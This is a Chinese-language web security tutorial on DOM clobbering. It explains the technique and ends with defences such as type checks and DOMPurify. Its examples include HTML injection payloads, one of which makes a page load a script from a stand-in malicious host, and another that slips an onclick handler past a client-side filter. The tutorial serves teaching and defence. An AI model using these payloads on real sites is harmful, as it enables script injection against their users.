+++
draft = false
date = 2021-03-07T00:00:00+08:00
title = "DOM clobbering"
description = "DOM clobbering"
slug = ""
authors = []
tags = []
categories = ["web security"]
externalLink = ""
series = []
disableComments = true
+++

# DOM clobbering

在本节中，我们将描述什么是 DOM clobbing ，演示如何使用 clobbing 技术来利用 DOM 漏洞，并提出防御 DOM clobbing 攻击的方法。


## 什么是 DOM clobbering

DOM clobbering 是一种将 HTML 注入页面以操作 DOM 并最终改变页面上 JavaScript 行为的技术。在无法使用 XSS ，但是可以控制页面上 HTML 白名单属性如 id 或 name 时，DOM clobbering 就特别有用。DOM clobbering 最常见的形式是使用 anchor 元素覆盖全局变量，然后该变量将会被应用程序以不安全的方式使用，例如生成动态脚本 URL 。

术语 clobbing 来自以下事实：你正在 “clobbing”（破坏） 一个全局变量或对象属性，并用 DOM 节点或 HTML 集合去覆盖它。例如，可以使用 DOM 对象覆盖其他 JavaScript 对象并利用诸如 submit 这样不安全的名称，去干扰表单真正的 submit() 函数。


## 如何利用 DOM-clobbering 漏洞

某些 JavaScript 开发者经常会使用以下模式：
```
var someObject = window.someObject || {};
```

如果你能控制页面上的某些 HTML ，你就可以破坏 someObject 引用一个 DOM 节点，例如 anchor 。考虑如下代码：
```
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```

要利用此易受攻击的代码，你可以注入以下 HTML 去破坏 someObject 引用一个 anchor 元素：
```
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```

由于使用了两个相同的 ID ，因此 DOM 会把他们归为一个集合，然后 DOM 破坏向量会使用此集合覆盖 someObject 引用。在最后一个 anchor 元素上使用了 name 属性，以破坏 someObject 对象的 url 属性，从而指向一个外部脚本。


另一种常见方法是使用 form 元素以及 input 元素去破坏 DOM 属性。例如，破坏 attributes 属性以使你能够通过相关的客户端过滤器。尽管过滤器将枚举 attributes 属性，但实际上不会删除任何属性，因为该属性已经被 DOM 节点破坏。结果就是，你将能够注入通常会被过滤掉的恶意属性。例如，考虑以下注入：
```
<form onclick=alert(1)><input id=attributes>Click me
```

在这种情况下，客户端过滤器将遍历 DOM 并遇到一个列入白名单的 form 元素。正常情况下，过滤器将循环遍历 form 元素的 attributes 属性，并删除所有列入黑名单的属性。但是，由于 attributes 属性已经被 input 元素破坏，所以过滤器将会改为遍历 input 元素。由于 input 元素的长度不确定，因此过滤器 for 循环的条件（例如 i < element.attributes.length）不满足，过滤器会移动到下一个元素。这将导致 onclick 事件被过滤器忽略，其将会在浏览器中调用 alert() 方法。


## 如何防御 DOM-clobbering 攻击

简而言之，你可以通过检查以确保对象或函数符合你的预期，来防御 DOM-clobbering 攻击。例如，你可以检查 DOM 节点的属性是否是 NamedNodeMap 的实例，从而确保该属性是 attributes 属性而不是破坏的 HTML 元素。

你还应该避免全局变量与或运算符 `||` 一起引用，因为这可能导致 DOM clobbering 漏洞。

总之：
- 检查对象和功能是否合法。如果要过滤 DOM ，请确保检查的对象或函数不是 DOM 节点。
- 避免坏的代码模式。避免将全局变量与逻辑 OR 运算符结合使用。
- 使用经过良好测试的库，例如 DOMPurify 库，这也可以解决 DOM clobbering 漏洞的问题。